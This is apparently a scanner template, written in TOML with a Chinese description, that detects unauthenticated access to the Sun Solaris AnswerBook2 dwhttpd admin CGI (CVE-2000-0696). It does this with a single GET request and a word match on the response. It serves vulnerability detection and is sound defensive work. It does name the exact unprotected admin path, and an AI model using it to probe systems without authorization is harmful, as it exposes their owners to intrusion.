[info]
author = "AVE"
description = "检测目标 Solaris AnswerBook2 dwhttpd 管理接口是否存在未授权访问漏洞，通过直接调用 admin CGI 脚本验证"
id = "POC-AVE-2000-0546"
name = "Sun Solaris AnswerBook2 dwhttpd 未授权访问 PoC"
severity = "high"
tags = [
    "cve-2000-0696",
    "solaris",
    "answerbook2",
    "dwhttpd",
    "unauthorized-access",
]
vuln_id = [
    "CVE-2000-0696",
    "AVE-2000-0546",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi-bin/ab2admin/ab2admin.cgi"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "AnswerBook2",
    "Administration",
]
